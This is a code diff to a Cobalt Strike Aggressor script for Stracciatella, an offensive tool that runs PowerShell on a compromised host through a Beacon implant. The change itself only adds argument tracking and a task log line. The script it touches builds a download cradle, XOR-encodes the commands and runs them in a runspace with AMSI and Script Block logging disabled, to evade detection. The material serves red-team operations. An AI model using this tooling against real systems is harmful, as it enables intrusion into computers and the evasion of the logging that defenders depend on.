@@ -14,7 +14,7 @@ beacon_command_register(
     "Use: stracciatella [-v] command\n\nDescription: Runs Stracciatella in a similar fashion to powerpick/powershell.\nIf '-v' is given, will result in verbose output from Stracciatella.\nThat will create a Powershell Runspace with Script Block logging and AMSI disabled for better OPSEC.");
 
 alias stracciatella {
-    local('$args $s $cradle $opts $key $enc $verbose');
+    local('$args $s $args0 $cradle $opts $key $enc $verbose');
 
     $args = substr($0, strlen("stracciatella "));
 
@@ -26,6 +26,7 @@ alias stracciatella {
 
     # generate the download cradle (if one exists) for an imported PowerShell script
     $cradle = beacon_host_imported_script($1);
+    $args0 = $args;
     if(strlen($cradle) > 0) {
         $s = "; ";
         if(right($cradle) eq ";") { $s = " "; }
@@ -36,5 +37,6 @@ alias stracciatella {
     $enc = base64_encode(str_xor($args, chr($key)));
     $opts = "$verbose $+ -x $key -e -c \" $+ $enc $+ \"";
 
-    bexecute_assembly($1, $STRACCIATELLA_PATH, $opts);
+    btask($1, "Tasked Beacon to run Stracciatella: $args0", "T1093");
+    bexecute_assembly!($1, $STRACCIATELLA_PATH, $opts);
 }
